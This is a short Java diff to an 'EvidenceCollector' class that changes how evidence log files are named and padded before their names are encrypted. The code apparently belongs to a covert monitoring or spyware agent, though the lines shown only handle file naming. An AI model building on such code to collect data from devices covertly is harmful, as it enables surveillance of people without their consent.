@@ -174,19 +174,7 @@ public final class EvidenceCollector implements Singleton {
         return log;
     }
 
-    /*
-     * private String MakeDateDir(Date date, int progressive) { long millis =
-     * date.getTime(); long mask = (long) 1E4; int lodate = (int) (millis %
-     * mask); int hidate = (int) (millis / mask); Calendar calendar =
-     * Calendar.getInstance(); calendar.setTime(date); int year =
-     * calendar.get(Calendar.YEAR); int month = calendar.get(Calendar.MONTH);
-     * int day = calendar.get(Calendar.DAY_OF_MONTH); int hour =
-     * calendar.get(Calendar.HOUR); int minute = calendar.get(Calendar.MINUTE);
-     * int second = calendar.get(Calendar.SECOND); String newname =
-     * NumberUtilities.toString(millis, 16, 6);
-     * //NumberUtilities.toString(lodate, 16, 8)+
-     * //NumberUtilities.toString(hidate, 16, 8); return newname; }
-     */
+
 
     /**
      * Gets the new progressive.
@@ -210,7 +198,7 @@ public final class EvidenceCollector implements Singleton {
         final int lodate = (int) (millis % mask);
         final int hidate = (int) (millis / mask);
 
-        final String newname = NumberUtilities.toString(lodate, 16, 8)
+        final String newname = NumberUtilities.toString(lodate, 16, 4)
                 + NumberUtilities.toString(hidate, 16, 8);
 
         return newname;
@@ -226,7 +214,7 @@ public final class EvidenceCollector implements Singleton {
      * @return the vector
      */
     public synchronized Vector makeNewName(final Evidence log,
-            final int logType, final boolean onSD) {
+            final String logType, final boolean onSD) {
         final Date timestamp = log.timestamp;
         final int progressive = getNewProgressive();
 
@@ -249,7 +237,7 @@ public final class EvidenceCollector implements Singleton {
 
         final String paddedProgressive = mask.substring(0, size) + ds;
 
-        final String fileName = paddedProgressive + "!" + logType + "!"
+        final String fileName = paddedProgressive + "" + logType + ""
                 + makeDateName(timestamp);
 
         final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
